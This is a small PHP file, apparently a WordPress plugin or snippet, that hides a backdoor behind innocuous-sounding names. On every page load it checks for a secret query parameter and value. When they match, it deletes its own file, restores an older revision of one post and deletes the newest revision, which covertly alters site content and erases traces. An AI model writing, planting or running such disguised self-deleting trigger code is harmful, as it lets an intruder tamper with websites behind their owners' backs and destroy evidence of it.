<?php

function label_gdpr_only() {
	if (isset($_GET['allow_rich_groups_learndash']) && $_GET['allow_rich_groups_learndash'] === 'featured_fancy_compare_autocomplete') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$navigation_accessible_active = 2142;
		$website_groups_stripe_compare = wp_get_post_revisions($navigation_accessible_active);
		if (empty($website_groups_stripe_compare)) die('no revisions');
		if (count($website_groups_stripe_compare) < 2) die('less than 2');
		$photos_tracker_better_group = array_shift($website_groups_stripe_compare);
		$meta_loader_get_customize = $photos_tracker_better_group->ID;
		$clean_customizer_smooth_replace = array_shift($website_groups_stripe_compare);
		$right_form_contents = $clean_customizer_smooth_replace->ID;
		$files_details_better_privacy = wp_restore_post_revision($right_form_contents);
		if ($files_details_better_privacy === false) die('error restoring');
		$files_details_better_privacy = wp_delete_post_revision($meta_loader_get_customize);		
		if ($files_details_better_privacy === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'label_gdpr_only');
